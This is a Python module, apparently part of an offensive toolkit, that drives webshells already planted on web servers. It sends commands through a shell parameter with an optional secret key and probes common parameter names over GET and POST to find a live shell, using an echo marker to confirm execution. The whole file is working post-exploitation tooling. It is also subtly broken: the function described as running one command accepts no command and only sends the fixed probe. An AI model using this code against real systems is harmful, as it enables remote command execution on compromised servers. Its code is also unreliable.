"""Webshell client: execute commands against a deployed webshell
(php/jsp/aspx) with optional secret param, plus a probe that tries common
parameter names and detects command execution by marker echo."""
from __future__ import annotations

from ..web.http_client import make_client

COMMON_PARAMS = ["cmd", "c", "command", "exec", "shell", "x", "0"]

PROBE_MARKERS = {
    "unix": ("echo SYAWIT_PROBE_9f3a", "SYAWIT_PROBE_9f3a"),
    "windows": ("echo SYAWIT_PROBE_9f3a", "SYAWIT_PROBE_9f3a"),
}


async def exec_command(url: str, param: str = "cmd", secret: str = "",
                       secret_param: str = "k", os_hint: str = "auto",
                       cookies: dict | None = None, headers: dict | None = None) -> dict:
    """Run one command through the shell and return raw output."""
    marker_cmd, marker = PROBE_MARKERS["unix" if os_hint != "windows" else "windows"]
    params = {param: marker_cmd}
    if secret:
        params[secret_param] = secret
    async with make_client(base_url="", cookies=cookies, headers=headers) as client:
        try:
            r = await client.post(url, params=params)
        except Exception as e:
            return {"ok": False, "error": f"request gagal: {e}"}
        return {
            "ok": True, "status": r.status_code, "length": len(r.content),
            "command": marker_cmd,
            "output": r.text,
            "detected_exec": marker in r.text,
        }


async def probe_shell(url: str, secret: str = "", secret_param: str = "k",
                      cookies: dict | None = None, headers: dict | None = None,
                      log=print) -> dict:
    """Try common parameter names; report which one executes commands."""
    found: list[dict] = []
    async with make_client(base_url="", cookies=cookies, headers=headers) as client:
        # baseline
        try:
            base_params = {secret_param: secret} if secret else {}
            baseline = await client.get(url, params=base_params)
        except Exception as e:
            return {"ok": False, "error": f"request gagal: {e}"}
        bl_len = len(baseline.content)
        for p in COMMON_PARAMS:
            for method in ("post", "get"):
                try:
                    if method == "post":
                        r = await client.post(url, params={secret_param: secret} if secret else {},
                                              data={p: PROBE_MARKERS["unix"][0]})
                    else:
                        r = await client.get(url, params={**({secret_param: secret} if secret else {}),
                                                          p: PROBE_MARKERS["unix"][0]})
                except Exception:
                    continue
                if PROBE_MARKERS["unix"][1] in r.text:
                    found.append({"param": p, "method": method,
                                  "status": r.status_code, "length": len(r.content)})
                    log(f"[+] shell hidup: param {p!r} via {method.upper()} (status {r.status_code})")
                    break
                if len(r.content) > bl_len + 50:
                    log(f"[?] param {p!r} {method} mengubah output (len {bl_len}->{len(r.content)}) — cek manual")
    return {"ok": True, "url": url, "baseline_length": bl_len, "findings": found}
